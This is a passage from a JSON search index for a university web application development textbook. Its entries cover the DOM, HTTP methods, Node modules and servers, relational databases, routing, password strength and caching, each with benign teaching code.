requesting\nBy additional information contained in the URL, specifically the query string (the part of the URL that follows the ?) and the hash string (the part of hte URL that follows the #)\nBy information contained in the body of the request\nWe\u0026rsquo;ve already looked at the path portion of the URL in describing how we can implement a file server to serve files and directories. But what about the query string and body of the request? Let\u0026rsquo;s look at how those are handled in Node next.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/a-html/04-inline-vs-block/",
	"title": "Inline vs. Block Elements",
	"tags": [],
	"description": "",
	"content": "Given that the role of HTML is markup, i.e. providing structure and formatting to text, HTML elements can broadly be categorized into two categories depending on how they affect the flow of text - inline and block.\nInline elements referred to elements that maintained the flow of text, i.e. the bring attention to (\u0026lt;b\u0026gt;) element used in a paragraph of text, would bold the text without breaking the flow:\n\u0026lt;p\u0026gt;The quick brown \u0026lt;b\u0026gt;fox\u0026lt;/b\u0026gt; lept over the log\u0026lt;/p\u0026gt;\nThe quick brown fox lept over the log\nIn contrast, block elements break the flow of text. For example, the \u0026lt;blockquote\u0026gt; element used to inject a quote into the middle of the same paragraph:\n\u0026lt;p\u0026gt;The quick brown fox \u0026lt;blockquote\u0026gt;What does the fox say? - YLVIS\u0026lt;/blockquote\u0026gt; lept over the log\u0026lt;/p\u0026gt;\nThe quick brown fox What does the fox say? - YLVIS lept over the log\nWhile HTML elements default to either block or inline behavior, this can be changed with the CSS display property.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/01-the-dom/04-js-and-the-dom/",
	"title": "JavaScript and the DOM",
	"tags": [],
	"description": "",
	"content": "The DOM tree is also accessible from JavaScript running in the page. It is accessed through the global window object, i.e. window.document or document.\nLet\u0026rsquo;s use the \u0026lsquo;Console\u0026rsquo; tab of the developer tools to access this object. Open the previous example page again from this link. Click the console tab to open the expanded console, or use the console area in the bottom panel of the elements tab:\nWith the console open, type:\n\u0026gt; document Info\nWhen instructed to type something into the console, I will use the \u0026gt; symbol to represent the cursor prompt. You do not need to type it.\nOnce you hit the enter key, the console will report the value of the expression document, which exposes the document object. You can click the arrow next to the #document to expose its properties:\nThe document is an instance of the Document class. It is the entry point (and the root) of the DOM tree data structure. It also implements the Node and EventTarget interfaces, which we\u0026rsquo;ll discuss next.\nThe Node Interface All nodes in the DOM tree implement the Node interface. This interface provides methods for traversing and manipulating the DOM tree. For example, each node has a property parentElement that references is parent in the DOM tree, a property childNodes that returns a NodeList of all the Node\u0026rsquo;s children, as well as properties referencing the firstChild, lastChild, previousSibling, and nextSibling.\nLet\u0026rsquo;s try walking the tree manually. In the console, type:\n\u0026gt; document.body.firstElementChild.firstElementChild The body property of the document directly references the \u0026lt;body\u0026gt; element of the webpage, which also implements the Node interface. The firstElementChild references the first HTML element that is a child of the node, so in using that twice, we are drilling down to the \u0026lt;h1\u0026gt; element.\nThe EventTarget Interface Each node in the DOM tree also implements the EventTarget interface. This allows arbitrary events to be attached to any element on the page. For example, we can add a click event to the \u0026lt;h1\u0026gt; element. In the console, type:\n\u0026gt; document.body.firstElementChild.firstElementChild.addEventListener(\u0026#39;click\u0026#39;, function(e){ console.log(e.target + \u0026#39; clicked!\u0026#39;); }); The first argument to EventTarget.addEventListener is the event to listen for, and the second is a function to execute when the event happens. Here we\u0026rsquo;ll just log the event to the console.\nNow try clicking on the Hello DOM! \u0026lt;h1\u0026gt; element. You should see the event being logged:\nWe can also remove event listeners with EventTarget.removeEventListener and trigger them programmatically with EventTarget.dispatchEvent.\nQuerying the DOM While we can use the properties of a node to walk the DOM tree manually, this can result in some very ugly code. Instead, the Document object provides a number of methods that allow you to search the DOM tree for a specific value. For example:\nDocument.getElementsByTagName returns a list of elements with a specific tag name, i.e. document.getElementsByTagName('p') will return a list of all \u0026lt;p\u0026gt; elements in the DOM. Document.getElementsByClassName returns a list of elements with a specific name listed in its class attribute, i.e. document.getElementsByClassName('banner') will return a list containing the \u0026lt;div.banner\u0026gt; element. Document.getElementById returns a single element with the specified id attribute. In addition to those methods, the Document object also supplies two methods that take a CSS selector. These are:\nDocument.querySelector which returns the first matching element in the DOM. Document.querySelectorAll which returns a list of all matching elements. Let\u0026rsquo;s try selecting the \u0026lt;h1\u0026gt; tag using the querySelector method:\n\u0026gt; var header = document.querySelector(\u0026#39;h1\u0026#39;); Much easier than document.body.firstElementChild.firstElementChild isn\u0026rsquo;t it?\nManipulating DOM Elements All HTML elements in the DOM also implement the HTMLElement interface, which also provides access to the element\u0026rsquo;s attributes and styling. So when we retrieve an element from the DOM tree, we can modify these.\nLet\u0026rsquo;s tweak the color of the \u0026lt;h1\u0026gt; element we saved a reference to in the header variable:\n\u0026gt; header.style.color = \u0026#39;blue\u0026#39;; This will turn the header blue:\nAll of the CSS properties can be manipulated through the style property.\nIn addition, we can access the element\u0026rsquo;s classList property, which provides an add() and remove() methods that add/remove class names from the element. This way we can define a set of CSS properties for a specific class, and turn that class on and off for an element in the DOM tree, effectively applying all those properties at once.\nModifying the DOM We can create new elements with the Document.createElement method. It takes the name of the new tag to create as a string, and an optional options map (a JavaScript object). Let\u0026rsquo;s create a new \u0026lt;p\u0026gt; tag. In the console:\n\u0026gt; var p = document.createElement(\u0026#39;p\u0026#39;); Now let\u0026rsquo;s give it some text:\n\u0026gt; p.textContent = \u0026#34;Tra-la-la\u0026#34;; Up to this point, our new \u0026lt;p\u0026gt; tag isn\u0026rsquo;t rendered, because it isn\u0026rsquo;t part of the DOM tree. But we can use the Node.appendChild method to add it to an existing node in the tree. Let\u0026rsquo;s add it to the \u0026lt;div.banner\u0026gt; element. Type this command into the console:\ndocument.querySelector(\u0026#39;div.banner\u0026#39;).appendChild(p); As soon as it is appended, it appears on the page:\nNote too that the CSS rules already in place are automatically applied!\nInfo\nThe popular JQuery library was created primarily as a tool to make DOM querying and manipulation easier at a time when browsers were not all adopting the w3c standards consistently. It provided a simple interface that worked identically in all commonly used browsers.\nThe JQuery function (commonly aliased to $()) operates much like the querySelectorAll(), taking a CSS selector as an argument and returning a collection of matching elements wrapped in a JQuery helper object. The helper object provided methods to access and alter the attributes, style, events, and content of the element, each returning the updated object allowing for functions to be \u0026lsquo;chained\u0026rsquo; into a single expression.\nThe above example, rewritten in JQuery, might be:\n$(\u0026#39;p\u0026#39;).text(\u0026#39;Tra-la-la\u0026#39;).appendTo(\u0026#39;div.banner\u0026#39;); While modern browsers are much more consistent at supporting standardized JavaScript, JQuery remains a popular library and one you will likely encounter. Thus, while this text focuses on \u0026lsquo;vanilla\u0026rsquo; JavaScript, we\u0026rsquo;ll also occasionally call out JQuery approaches in blocks like this one.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/04-node/04-modules/",
	"title": "Modules",
	"tags": [],
	"description": "",
	"content": "One major feature Node introduced to JavaScript was the ability to encapsulate code into separate files using modules. The approach adopted by Node is the CommonJS module pattern.\nWarning\nNode\u0026rsquo;s use of modules predates ECMA6\u0026rsquo;s adoption of modules, and the CommonJS approach Node adopted is fundamentally different than the ECMA6 version. For Node 16 (installed on your Codio Box), ECMA6 modules are an optional feature that has to be enabled with a flag when invoking the node command, i.e.:\n$ node --input-type=module \u0026lt;file\u0026gt; We can also enable ECMA6 module support by using the .mjs file extension, or by setting an option in the package.json file present in our project. See the NodeJS Documentation for more information.\nWriting a Module A module is simply a JavaScript file (typically saved with a js extension). Code within the module is locally scoped to the module; code intended to be accessed outside of the module must be explicitly exported by assigning it to the module.exports parameter. This example exports a function to print \u0026ldquo;Hello World\u0026rdquo;:\n/* hello.js */ function helloWorld() { console.log(\u0026#34;Hello World\u0026#34;); } module.exports = helloWorld; You can export a value, function, or object from a module. If you don\u0026rsquo;t specify an export, a module exports undefined.\nLoading a Module CommonJS Modules are loaded using the require() function, which loads the JavaScript in the module and returns any exports from the module. Objects, functions, or even values can be exported, i.e. this example loads our earlier module, assigns the result to the variable greet, and invokes it:\nvar greet = require(\u0026#39;./hello\u0026#39;); greet(); This example will print \u0026ldquo;Hello World\u0026rdquo; to the console.\nThere are three kinds of modules you can load in Node: 1) core libraries, 2) npm packages, and 3) user-authored modules.\nCore libraries are part of Node. Examples are the fs (file system) library, the http library, and the crypto library. A full list of libraries can be found in the Node documentation. Node libraries are required using their name as as the argument, i.e. require('fs') will require the filesystem library.\nNpm packages are typically open-source libraries created by the community and are downloaded using the Node Package Manager (npm). These are installed either globally, or within a node_modules folder created by npm within your project. Npm modules are required by their package name, i.e. require('webpack') will load the webpack package.\nUser-written modules are loaded from the filesystem, and are typically located in your project directory or subdirectories within it. They are required using the filepath to their file, i.e. require('./hello.js). It is important to use the period-slash (./) indicating current directory to distinguish files from npm packages.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/07-persistent-storage/04-relational-databases/",
	"title": "Relational Databases",
	"tags": [],
	"description": "",
	"content": "Relational databases (also called SQL databases) provide a highly-structured storage mechanism. Data is organized into tables, with each column representing a single value and data type, and each row representing one entry. Conceptually, this organization is similar to tables you have seen in Excel and on the web. An example persons table is listed below:\nid First Last 0 Lisa Merkowsky 1 Frank Stiles 3 Mary Cotts Relational databases are often called SQL databases as we use Structured Query Language (SQL) to communicate with them. This is a domain-specific language similar to the LINQ you may have learned about in CIS 400 (actually, LINQ derives much of its syntax from SQL). Queries are streamed to a relational database across a socket or other connection, much like HTTP requests and responses are. The response is received also as text which must be parsed to be used.\nSQL is used to construct the structure of the database. For example, we could create the above table with the SQL command:\nCREATE TABLE persons ( id PRIMARY KEY, Last TEXT, First TEXT, ); SQL is also used to query the database. For example, to find all people with the last name \u0026ldquo;Smith\u0026rdquo;, we would use the query:\nSELECT * FROM persons WHERE last=\u0026#39;Smith\u0026#39;; You will learn more about writing SQL queries in the CIS 560 or CC 520 course. You can also find an excellent guide on W3C schools, with interactive tutorials. We\u0026rsquo;ll briefly cover some of the most important aspects of relational databases for web developers here, but you would be wise to seek out additional learning opportunities. Understanding relational databases well can make a great deal of difference in how performant your web applications are.\nThe key to performance in relational databases is the use of keys and indices. A key is a column whose values are unique (not allowed to be repeated). For example, the id column in the table above is a key. Specifically, it is a sequential primary key - for each row we add to the table it increases, and its value is determined by the database. Note the jump from 1 to 3 - there is no guarantee the keys will always be exactly one more than the previous one (though it commonly is), and if we delete rows from a table, the keys remain the same.\nIndices An index is a specialized data structure that makes searching for data faster. Consider the above table. If we wanted to find all people with the last name \u0026ldquo;Smith\u0026rdquo;, we\u0026rsquo;d need to iterate over each row, looking for \u0026ldquo;Smith\u0026rdquo;. That is a linear $O(n)$ complexity. It would work quickly in our example, but when our table has thousands or millions of rows (not uncommon for large web apps), it would be painfully slow.\nRemember learning about dictionaries or hash tables in your data structures course? The lookup time for one of those structures is constant $O(1)$. Indices work like this - we create a specialized data structure that can provide the index we are looking for, i.e. an index built on the Last column would map last =\u0026gt; id. Then we could retrieve all \u0026ldquo;Smith\u0026rdquo; last names from this structure in constant time $O(1)$. Since we know the primary key is unique and ordered, we can use some kind of divide-and-conquer search strategy to find all rows with a primary key in our set of matches, with a complexity of $O(log(n))$. Thus, the complete lookup would be $O(log(n)) + O(1)$, which we would simplify to $O(log(n))$, much faster for a large $n$ than $O(n)$.\nInfo\nIn truth, most SQL databases use Balanced Trees (B-Trees) for their indices; but the exact data structure is unimportant to us as web developers, as long as retrieval is efficient.\nWe can create an index using SQL. For example, to create an index on the column last in our example, we would use:\nCREATE INDEX last_index ON persons (last); An index can involve more than one row - for example, if we expected to search by both first and last name, we\u0026rsquo;d probably create an index that used both as the key. The SQL to do so for both first and last names would be:\nCREATE INDEX both_names ON persons (last, first); Each index effectively creates a new data structure consuming additional memory, so you should consider which indices are really necessary. Any column or column you frequently look up values by (i.e. are part of the WHERE clause of a query) should be indexed. Columns that are only rarely or never used this way should not be included in indices.\nRelationships The second important idea behind a relational database is that we can define relationships between tables. Let\u0026rsquo;s add a second table to our example, addresses:\nid person_id street city state 0 0 Anderson Ave. Manhattan KS 1 1 Sesame St. Baltimore ML 2 1 Moholland Dr. Hollywood CA 3 3 Cooper Street Silver City NM Here person_id is a foreign key, and corresponds to the id in the persons table. Thus, we can look up the address of Lisa Merkowsky by her id of 0. The row in the addresses table with the value of 0 for person_id is \u0026ldquo;Anderson Ave., Manhattan KS\u0026rdquo;.\nNote too that it is possible for one row in one table to correspond to more than one row in another - in this example Frank Styles has two addresses, one in Baltimore and one in Hollywood.\nIf one row in one table corresponds to a single row in another table, we often call this a one-to-one relationship. If one row corresponds to more than one row in another table, we call this a one-to-many relationship. We retrieve these values using a query with a JOIN clause, i.e. to get each person with their addresses, we might use:\nSELECT last, first, street, city, state FROM persons LEFT JOIN addresses ON persons.id = addresses.person_id; The result will also be structured as a table with columns last, first, street, city, and state containing a row for each person. Actually, there will be two rows for Frank, one containing each of his two addresses.\nFinally, it is possible to have a many-to-many relationship, which requires a special table to sit in between the two called a join table. Consider if we had a jobs table:\nid name description 0 Doctor A qualified practitioner of medicine; a physician. 1 Lawyer A person who practices or studies law; an attorney or a counselor. 2 Producer A person responsible for the financial and managerial aspects of making of a movie or broadcast or for staging a play, opera, etc. 3 Detective A person, especially a police officer, whose occupation is to investigate and solve crimes. (definitions provided by Oxford Languages) Because more than one person can have the same job, and we might want to look up people by their jobs, or a list of jobs that a specific person has, we would need a join table to connect the two. This could be named persons_jobs and would have a foreign key to both:\nid person_id job_id 0 1 1 1 2 2 2 3 1 3 3 3 Thus Lisa is a doctor, Frank a producer, and Mary is both a doctor and detective! We could query for every doctor using a SQL statement with two joins, i.e.:\nSELECT first, last FROM jobs LEFT JOIN persons_jobs ON jobs.id = persons_jobs.job_id LEFT JOIN persons ON jobs_persons.person_id = person.id WHERE jobs.name = \u0026#39;Doctor\u0026#39;; As suggested before, this is just scraping the surface of relational databases. You\u0026rsquo;ll definitely want to spend more time studying them, as they remain the most common form of persistent storage used on the web and in other industries as well.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/04-request-methods/",
	"title": "Request Methods",
	"tags": [],
	"description": "",
	"content": "The first line of the HTTP request includes the request method, which indicates what kind of action the request is making of the web server (these methods are also known as HTTP Verbs). The two most common are GET and POST, as these are supported by most browsers.\nCommonly HTTP Methods The following requests are those most commonly used in web development. As noted before GET and POST requests are the most commonly used by web browsers, while GET, PUT, PATCH, and DELETE are used by RESTful APIs. Finally, HEAD can be used to optimize web communications by minimizing unnecessary data transfers.\nGET A GET request seeks to retrieve a specific resource from the web server - often an HTML document or binary file. GET requests typically have no body and are simply used to retrieve data. If the request is successful, the response will typically provide the requested resource in its body.\nHEAD A HEAD request is similar to a GET request, except the response is not expected to provide a body. This can be used to verify the type of content of the resource, the size of the resource, or other metadata provided in by the response header, without downloading the full data of the resource.\nPOST The POST request submits an entity to the resource, i.e. uploading a file or form data. It typically will have a body, which is the upload or form.\nPUT The PUT request is similar to a POST request, in that it submits an entity as its body. It has a more strict semantic meaning though; a PUT request is intended to replace the specified resource in its entirety.\nPATCH The PATCH request is also similar to POST and PUT requests - it submits an entity as its body. However, its semantic meaning is to only apply partial modifications the specified entity.\nDELETE As you might expect, the DELETE method is used to delete the specified resource from the server.\nInfo\nAdditional methods include CONNECT, which establishes a tunnel to a server; OPTIONS, which identifies communications options with a resource, and TRACE, which performs a message loop-back test to the target resource. HTTP Methods are defined in W3C\u0026rsquo;s RFC2616.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/08-routing/04-request-revisited/",
	"title": "Request Revisted",
	"tags": [],
	"description": "",
	"content": "We\u0026rsquo;ve seen then how the request conveys information useful to selecting the appropriate endpoint with the path, and also the query string. But there is more information available in our request than just those two tidbits. And we have all of that information available to us for determining the correct response to send. With that in mind, let\u0026rsquo;s revisit the parts of the request in terms of what kinds of information they can convey.\nThe URL, Revisited Now that we\u0026rsquo;re thinking of the URL as a tool for passing information to the server, let\u0026rsquo;s reexamine its parts:\nThe protocol is the protocol used for communication, and the host is the domain or IP address of the server. Note that these are not included in Node\u0026rsquo;s req.url parameter, as these are used to find the right server and talk to it using the right protocol - by the time your Node server is generating the req object, the request has already found your server and is communicating with the protocol.\nThis is also why when we\u0026rsquo;ve been parsing req.url with the URL object, we\u0026rsquo;ve supplied a host and protocol of http://localhost:\nvar url = new URL(req.url, \u0026#34;http://localhost\u0026#34;); This gives the URL object a placeholder for the missing protocol and host, so that it can parse the supplied URL without error. Just keep in mind that by doing so the url.protocol and url.host properties of url equal this \u0026ldquo;fake\u0026rdquo; host and protocol.\nThe path is the path to the virtual resource requested, accessible in our parsed URL as url.pathname. Traditionally, this corresponded to a file path, which is how we used it in our fileserver examples. But as we have seen with Placeholder.com, it can also be used to convey other information - in that case, the size of the image, its background color, and foreground color.\nThe query or querystring is a list of key-value pairs, proceeded by the ?. Traditionally this would be used to modify some aspect of the request, such as requesting a particular data format or portion of a dataset. It is also how forms are submitted with a GET request - the form data is encoded into the query string.\nThe hash or fragment is proceeded by a #, and traditionally indicates an element on the page that the browser should auto-scroll to. This element should have an id attribute that matches the one supplied by the hash. For example, clicking this link: #the-url-revisited will scroll back to the header for this section (note we left the path blank, so the browser assumes we want to stay on this page).\nClearly our URL can clearly convey a lot of data to our server. But that\u0026rsquo;s not the only information that we can use in deciding how to respond to a request.\nRequest Method, Revisited In addition, we also receive the HTTP Method used for the request, i.e. GET, POST, PATCH, PUT, or DELETE. These again map back to the traditional role of a web server as a file server - GET retrieves a resource, POST uploads one, PATCH and PUT modify one, and DELETE removes it. But we can also create, read, update, and destroy virtual resources, i.e. resources generated and stored on the server that are not files. These play an especially important role in RESTful routes, which we\u0026rsquo;ll discuss soon.\nHeaders, Revisited We can also convey additional information for the server to consider as part of the request headers. This is usually used to convey information tangential to the request, like authentication and cookies. We\u0026rsquo;ll also discuss this a bit further on.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/10-dynamic-web-frameworks/04-single-page-apps/",
	"title": "Single Page Apps",
	"tags": [],
	"description": "",
	"content": "Client-side frameworks often focus on creating single page apps. In this pattern, the entire website consists of a single HTML page with very little content, mostly the \u0026lt;script\u0026gt; elements to download a large client-side JavaScript library. Once downloaded, this library populates the page with HTML content by directly manipulating the DOM.\nConsider a drawing application for creating pixel art. It is entirely possible to write a single-page application that only needs a webserver to serve its static HTML and JavaScript files. Once downloaded into the browser, you could draw with it and download the resulting images directly out of the browser - no further server interaction is needed! Thus, you can host such an app on a simple static hosting service at very low cost.\nOn the other hand, if you did need server functionality (say you want to be able to save drawings to the server and re-open them on a different machine), you can combine your client-side app with a server-side API. It would provide authentication and persistent storage through a few endpoints, most likely communicating through sending JSON as requests and responses.\nA good example of this kind of client-side application is MIT Media Labs\u0026rsquo; Scratch, a block-based programming environment for teaching programming. The Scratch Development Environment is a client-side app that provides the programming environment, a vm for running the Scratch program, and the user interface code for displaying the result of running that program. All of the computation of running the Scratch program is therefore done in the browser\u0026rsquo;s JavaScript environment, not on the server. The server provides a minimal API for saving Scratch projects and their resources, as well as publishing them - but the actual heavy computation is always done on the client.\nThis approach - offloading heavy computation to the browser instead of the server means servers don\u0026rsquo;t need to work as hard. The benefit is they can be less powerful machines and serve more users while consuming less power, and generating less waste heat. This is why Google Docs, Microsoft 360, Facebook, and other big players have been pushing as much of their site\u0026rsquo;s computational needs to the client for years.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/09-auth/04-stronger-passwords/",
	"title": "Stronger Passwords",
	"tags": [],
	"description": "",
	"content": "Now that we\u0026rsquo;ve discussed how to build a password-based authentication system as securely as possible, we should take a moment to understand what makes a good password. While we can\u0026rsquo;t force users to use good passwords, we can encourage them to do so, and potentially build some requirements/guidance into our sign up forms.\nYou\u0026rsquo;ve likely been told multiple times that a good password is a mix of numbers, upper- and lower-case letters, and special symbols. While this is indeed marginally better than a password of the same length that uses only letters, it isn\u0026rsquo;t much. Remember that with some clever programming and a graphics card, passwords can be brute-forced. The amount of time this takes is more dependent on the length of the password than the combination of characters. This XKCD comic sums up the issue succinctly:\nIn short, the best passwords are actually pass phrases - a combination of words that is easy to remember and of significant length. Given this is mathematically demonstrable, why do so many authentication services insist on a complex scheme for making short passwords? I suspect it is a legacy from when storage space was at a premium, as well as a nod to database performance.\nThink back to our SQL discussions - we can declare text in two ways - a VARCHAR (which has a set maximum length), or TEXT (which can be any size). These roughly correspond to value and reference types in a programming language - VARCHARS are stored inline with table data, while TEXT entries are stored separately, and an address of their location is stored in the table. If we\u0026rsquo;re retrieving thousands or millions of rows including TEXT values, we have to pull those values from their disparate locations - adding overhead to the query. VARCHARS we get with the row for no extra time cost. So storing passwords as a VARCHAR would give better performance, and limiting them to a small size (by imposing a character limit) would save on storage requirements.\nIn the modern web, with storage costs as low as they are, there is no excuse for clinging to short passwords with arcane requirements. If you are going to force your users to meet any rules for your password system, it should be a minimum length.\nOr, we can side-step the issue entirely, by passing responsibility for authentication to a third party. We\u0026rsquo;ll look at these strategies next.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/05-web-servers/04-importance-of-async/",
	"title": "The Importance of Being Async",
	"tags": [],
	"description": "",
	"content": "You may have noticed that we used the asynchronous version of fs.readFile() in our response handler. This is critical to good performance with a Node-based webserver - any potentially blocking action taken in the request handler should be asynchronous, because all incoming requests must be processed on the same thread. If our event loop gets bogged down handling a blocked process, then nobody gets a response!\nConsider if we implemented one of the file serving options using the synchronous fs.readFileSync():\n// TODO: Serve the site js file try { var body = fs.readFileSync(\u0026#39;site.js\u0026#39;); res.writeHead(200, { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/javascript\u0026#34;, \u0026#34;Content-Length\u0026#34;: body.length }).end(body, \u0026#34;utf8\u0026#34;); } catch(err) { res.writeHead(500).end(); } It does not look that different from the asynchronous version, but consider what happens if site.js cannot be opened immediately (perhaps it is locked by a system process that is modifying it). With the synchronous version, we wait for the file to become available. While we wait, incoming requests are added to our event queue\u0026hellip; and none are processed, as the event loop is paused while we are waiting for fs.readFileSync('site.js') to resolve. If it takes more than three seconds, the clients that are waiting will start seeing timeouts in their browsers, and will probably assume our site is down.\nIn contrast, if we used the asynchronous version, the reading of the file is handed off to another thread when fs.readFile() is invoked. Any additional processing to do within the event loop for this request is finished, and the next task is pulled from the event queue. Even if our request for the original file never completes, we still are serving requests as quickly as we get them.\nThis asynchronous approach is key to making a Node-based website perform and scale well. But it is vitally important that you, as a web developer, understand both why using asynchronous processes is important, and how to use them correctly. Because if you don\u0026rsquo;t, your application performance can be much, much worse than with other approaches.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/04-what-you-will-learn/",
	"title": "What You&#39;ll Learn",
	"tags": [],
	"description": "",
	"content": " Web Only\nThis textbook was authored for the CIS 526 - Web Application Development course at Kansas State University. This front matter is specific to that course. If you are not enrolled in the course, please disregard this section.\nThe following is an outline of the topics we will be covering and when.\nWarning\nThis course is still under development, so some of the content listed here may change before we reach that module.\nWeek 1: Web Application Foundations The Document Object Model Chapter 1 [Tutorial] Creating a Dialog HTTP Chapter 2 [Activity] Making Manual HTTP Requests Responsive Design Chapter B [Tutorial] Responsive Card Layout Project Milestone 1 Card Layout Accessing Data from a Web API Week 2: Advanced JavaScript JSON and AJAX [Activity] Working with JSON [Activity] Making an AJAX Request Asynchronous JavaScript Chapter 3 [Tutorial] Web Workers Introduction to Node Chapter 4 [Tutorial] Your First Package [Activity] Fun with Files Project Milestone 2 Request Data via AJAX Dynamically Render Page Week 3: Web Servers Basic Web Server Chapter 5 [Tutorial] Hello Web File Server Basics Chapter 5 (cont.) [Tutorial] Node File Server Directory Listing Chapter 5 (cont.) [Tutorial] Directory Listing Partial Downloads Chapter 5 (cont.) Chapter C [Activity] Regular Expressions [Tutorial] Streaming Media Project Milestone 3 Refactor Project to Node Week 4: Dynamic Web Servers Server Pages Chapter 6 [Exercise] ECMAScript Server Pages [Tutiroal] Image Gallery Uploading Data Chapter 6 (cont.) [Exercise] Uploading Form Data [Exercise] Uploading Files Adding State Chapter 6 (cont.) [Activity] Fun with Cookies [Tutorial] Gallery Favorites Week 5: Full Stack Development Templates Chapter 6 (cont.) [Tutorial] Node Directory Listing in EJS [Exercise] A Template By Another Name Full Stack Development Chapter 6 (cont.) Persistent Storage Chapter 7 [Tutorial] Blog Part 1 Routing Chapter 8 [Tutorial] Blog Part 2 [Tutorial] Blog Part 3 Project Milestone 4 REfactor to Express Add API Endpoints Handle Requests for Items Templates Week 6: Web Frameworks Authentication Chapter 9 [Tutorial] Blog Part 4 [Tutorial] Blog Part 5 APIs Chapter 8 (cont.) [Tutorial] Blog Part 6 [Exercise] Web Hook Demo Web Frameworks Chapter 10 [Tutorial] Single Page App Part 1 [Tutorial] Single Page App Part 2 Project Milestone 5 Implement Authentication Restrict Form Access to Authenticated Users Week 7 \u0026amp; 8: Potpourri Single Sign On Chapter 9 (cont.) [Tutorial] CAS Authentication ASP.NET MVC [Tutorial] ASP.NET MVC React \u0026amp; Websockets [Tutorial] React Chat App Project Milestone 6 Mark Requests Complete Administrator Role \u0026amp; Tasks "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/04-node/",
	"title": "Introduction to Node",
	"tags": [],
	"description": "",
	"content": "Chapter 4 Introduction to Node JavaScript on the Server\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/05-web-servers/05-caching-win/",
	"title": "Caching for the Win",
	"tags": [],
	"description": "",
	"content": "In our example web server, we argued that asynchronous file reading was better than synchronous because reading from a file is a potentially blocking operation that can take a long time to perform. But even when it doesn\u0026rsquo;t block, it can still take a lot of time, making it the most expensive part of our request handling operation in terms of the time it takes to perform.\nIf we really want to squeeze all the performance we can out of our server (and therefore handle as many users as possible), we need to consider the strategy of caching. This means storing our file content in a location where access is faster - say in memory rather than on the disk. Variables in our application are stored in RAM, even variables whose contents were initialized from disk files. Thus, assigning the contents of a file to a variable effectively caches it for faster access.\nMoreover, because Node variables are only accessible from the Node process, which from our perspective in the event loop is single-threaded, we don\u0026rsquo;t have to worry about blocking once the file has been loaded. One strategy we can employ is to pre-load our files using synchronous operations, i.e.:\nconst http = require(\u0026#39;http\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const html = fs.readFileSync(\u0026#39;index.html\u0026#39;); const css = fs.readFileSync(\u0026#39;site.css\u0026#39;); const js = fs.readFileSync(\u0026#39;site.js\u0026#39;); Now we can define our revised event handler, which uses the cached versions:\nfunction handleRequest(req, res) { if(req.method === \u0026#34;GET\u0026#34;) { switch(req.url) { case \u0026#34;/index.html\u0026#34;: // Serve the index page res.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;, \u0026#39;Content-Length\u0026#39;: html.length}).end(html); break; case \u0026#34;/site.css\u0026#34;: // Serve the css file res.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;, \u0026#39;Content-Length\u0026#39;: css.length}).end(css); break; case \u0026#34;/site.js\u0026#34;: // Serve the js file res.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;, \u0026#39;Content-Length\u0026#39;: js.length}).end(js); break; default: // Serve a 404 Not Found response res.writeHead(404).end(); } } else { // Serve a 501 Not Implemented response res.writeHead(501).end(); } } Finally, we create and start the server:\nvar server = http.createServer(handleRequest); server.listen(80, ()=\u0026gt;{ console.log(\u0026#34;Server listening on port 80\u0026#34;); }); Notice in this server implementation we use the synchronous fs.readFileSync(), and we don\u0026rsquo;t wrap it in a try ... catch. That means if there is a problem loading one of the files, our Node process will crash. But as these files are loaded first, before the server starts, we should see the error, and realize there is a problem with our site files that needs fixed. This is one instance where it does make sense to use synchronous file calls.\nWhile caching works well in this instance, like everything in computer science it doesn\u0026rsquo;t work well in all instances. Consider if we had a server with thousands of files - maybe images that were each 500 Megabytes. With only a thousand images, we\u0026rsquo;d have 500 Gigabytes to cache\u0026hellip; which would mean our server would need a lot of expensive RAM. In a case like that, asynchronous file access when the file is requested makes far more sense.\nAlso, depending on the use pattern it may make sense to cache some of the most frequently requested images. With careful design, this caching can be dynamic, changing which images are cached based on how frequently they are requested while the server is running.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/05-textbooks/",
	"title": "Course Textbooks",
	"tags": [],
	"description": "",
	"content": " Web Only\nThis textbook was authored for the CIS 526 - Web Application Development course at Kansas State University. This front matter is specific to that course. If you are not enrolled in the course, please disregard this section.\nThis course does not have a required print textbook. The resources presented in the modules are also organized into an online textbook that can be accessed here: https://textbooks.cs.ksu.edu/cis526. You may find this a useful reference if you prefer a traditional textbook layout. Additionally, since the textbook exists outside of Canvas\u0026rsquo; access control, you can continue to utilize it after the course ends.\nWarning\nPlease note that the materials presented in Canvas have additional graded assignments and exercises worked into the reading order that do not appear in the online edition of the textbook. You are responsible for completing these!\nO\u0026rsquo;Riley for Higher Education If you are looking for additional resources to support your learning, a great resource that is available to Kansas State University students is the O\u0026rsquo;Riley For Higher Education digital library offered through the Kansas State University Library. These include electronic editions of thousands of popular textbooks as well as videos and tutorials. As of this writing, a search for HTML returns 33,690 results, CSS 8,638 results, JavaScript 16,725 results, and Node.js 6,572 results.\nThere are likewise materials for other computer science topics you may have an interest in - it is a great resource for all your CS coursework. It costs you nothing (technically, your access was paid for by your tuition and fees), so you might as well make use of it!\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/05-cascade-algorithm/",
	"title": "CSS Cascade",
	"tags": [],
	"description": "",
